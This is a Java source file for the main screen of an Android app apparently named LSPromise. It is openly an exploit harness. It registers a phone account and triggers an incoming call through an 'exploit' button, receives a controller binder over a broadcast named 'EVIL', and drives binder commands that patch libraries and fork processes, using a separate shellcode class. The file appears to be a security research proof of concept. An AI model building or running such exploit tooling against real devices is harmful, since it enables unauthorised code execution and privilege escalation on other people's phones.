package org.lsposed.lspromise;

import static org.lsposed.lspromise.Shellcode.TAG;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.util.Log;
import android.view.View;
import android.view.WindowInsets;
import android.widget.Button;
import android.widget.TextView;

/**
 * @author canyie
 */
public class MainActivity extends Activity implements View.OnClickListener {
    private PhoneAccountHandle phoneAccountHandle;
    private TelecomManager telecomManager;
    private BroadcastReceiver receiver;
    private IBinder controller;
    private TextView tv;

    private void doAction(int code, String name) {
        if (controller != null) {
            new Thread(() -> {
                var p = Parcel.obtain();
                var r = Parcel.obtain();
                try {
                    if (controller.transact(code, p, r, 0)) {
                        var res = r.readInt();
                        runOnUiThread(() -> {
                            tv.append(name + " res=" + res + "\n");
                        });
                    } else {
                        throw new IllegalStateException("return false");
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "do action " + code + " " + name, t);
                    runOnUiThread(() -> {
                        tv.append(name + " failed: " + t.getMessage() + "\n");
                    });
                } finally {
                    p.recycle();
                    r.recycle();
                }
            }).start();
        }
    }

    private void runAll() {
        if (controller != null) {
            new Thread(() -> {
                var p = Parcel.obtain();
                var r = Parcel.obtain();
                var b = new Binder() {
                    @Override
                    protected boolean onTransact(int code, Parcel data, Parcel reply, int flags) throws RemoteException {
                        try {
                            var s = data.readString();
                            Log.d(TAG, "onTransact " + s);
                            runOnUiThread(() -> {
                                tv.append(s);
                            });
                        } catch (Throwable t) {
                            Log.e(TAG, "recv failed", t);
                        }
                        return true;
                    }
                };
                p.writeStrongBinder(b);
                try {
                    if (controller.transact(5, p, r, 0)) {
                        var res = r.readInt();
                        runOnUiThread(() -> {
                            tv.append("\nrunall done res=" + res + "\n");
                        });
                    } else {
                        throw new IllegalStateException("return false");
                    }
                } catch (Throwable t) {
                    Log.e(TAG, "runall failed", t);
                    runOnUiThread(() -> {
                        tv.append("runall failed: " + t.getMessage() + "\n");
                    });
                } finally {
                    p.recycle();
                    r.recycle();
                }
            }).start();
        }
    }

    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        var rootView = findViewById(android.R.id.content);
        rootView.setOnApplyWindowInsetsListener((v, insets) -> {
            var systemBars = insets.getInsets(WindowInsets.Type.systemBars());
            v.setPadding(0, systemBars.top, 0, 0);
            return insets;
        });
        telecomManager = getSystemService(TelecomManager.class);
        phoneAccountHandle = new PhoneAccountHandle(new ComponentName(this, MyConnectionService.class), "LSPromise");
        PhoneAccount phoneAccount = new PhoneAccount.Builder(phoneAccountHandle, "LSPromise account")
                .setCapabilities(PhoneAccount.CAPABILITY_SELF_MANAGED)
                .build();
        telecomManager.registerPhoneAccount(phoneAccount);
        findViewById(R.id.exploit).setOnClickListener(this);
        tv = (TextView) findViewById(R.id.status);
        var patchMod = (Button) findViewById(R.id.patchMod);
        patchMod.setOnClickListener(v -> {
            doAction(1, "patchMod");
        });
        var patchLibc = (Button) findViewById(R.id.patchLibc);
        patchLibc.setOnClickListener(v -> {
            doAction(2, "patchLibc");
        });
        var patchCxx = (Button) findViewById(R.id.patchCxx);
        patchCxx.setOnClickListener(v -> {
            doAction(3, "patchCxx");
        });
        var forkProcess = (Button) findViewById(R.id.forkProcess);
        forkProcess.setOnClickListener(v -> {
            doAction(4, "forkProcess");
        });
        var patchAll = (Button) findViewById(R.id.patchAll);
        patchAll.setOnClickListener(v -> {
            runAll();
        });
        var copyAll = (Button) findViewById(R.id.copyAll);
        copyAll.setOnClickListener(v -> {
            var cm = getSystemService(ClipboardManager.class);
            cm.setPrimaryClip(ClipData.newPlainText("", tv.getText().toString()));
        });
        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                Log.d(TAG, "controller received");
                try {
                    var binder = intent.getExtras().getBinder("CONTROLLER");
                    controller = binder;
                    tv.append("controller received\n");
                    patchMod.setVisibility(View.VISIBLE);
                    patchLibc.setVisibility(View.VISIBLE);
                    patchCxx.setVisibility(View.VISIBLE);
                    forkProcess.setVisibility(View.VISIBLE);
                    patchAll.setVisibility(View.VISIBLE);
                } catch (Throwable t) {
                    Log.e(TAG, "resolve controller", t);
                }
            }
        };
        registerReceiver(receiver, new IntentFilter("EVIL"), Context.RECEIVER_EXPORTED);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (receiver != null)
            unregisterReceiver(receiver);
    }

    @Override public void onClick(View v) {
        telecomManager.addNewIncomingCall(phoneAccountHandle, null);
    }
}
